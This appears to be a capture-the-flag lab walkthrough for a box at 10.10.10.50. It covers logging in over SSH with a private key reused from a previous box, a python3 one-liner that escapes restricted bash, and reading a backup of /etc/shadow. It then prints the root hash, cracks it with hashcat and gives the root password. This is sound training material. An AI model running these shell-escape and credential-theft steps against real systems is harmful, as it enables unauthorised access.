![[Pasted image 20210427091753.png]]

Starting with basic nmap scan 

`nmap -sC -sV 10.10.10.50`

![[Pasted image 20210427092230.png]]

We see that we only have port 22 open and when search for exploit for the 7.6p1 ssh version we don't come up with anything useful 

We have the `id_rsa` file , which is the private key of the user daniel from the previous box

We can use it to log into this box

`ssh -i id_rsa daniel@10.10.10.50`

![[Pasted image 20210427092847.png]]

We see that here we are in the rbash (restricted bash) shell and we are allowed to run only some commands 

We cannot run cat or vi but we can run python3

![[Pasted image 20210427093340.png]]

`python3 -c "import os;os.system('/bin/sh');"`

We can execute any system commands in the os.system() 

By using this python oneliner we get a normal non restricted shell of the daniel user

![[Pasted image 20210427094014.png]]

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

By using this python oneliner we get a stabalized shell

We see that we have access to the backup folder and we see that the /etc/shadow file is readable by us 

![[Pasted image 20210427094548.png]]

`root:$6$KIP2PX8O$7VF4mj1i.w/.sIOwyeN6LKnmeaFTgAGZtjBjRbvX4pEHvx1XUzXLTBBu0jRLPeZS.69qNrPgHJ0yvc3N82hY31:18334:0:99999:7:::
`

We can crack this hash using hashcat 

`hashcat -m 1800 hash /usr/share/wordlists/rockyou.txt`

![[Pasted image 20210427095253.png]]

We get the password for the root user 

Username : `root`

Password : `password#1`

![[Pasted image 20210427095427.png]]

We get the root.txt flag

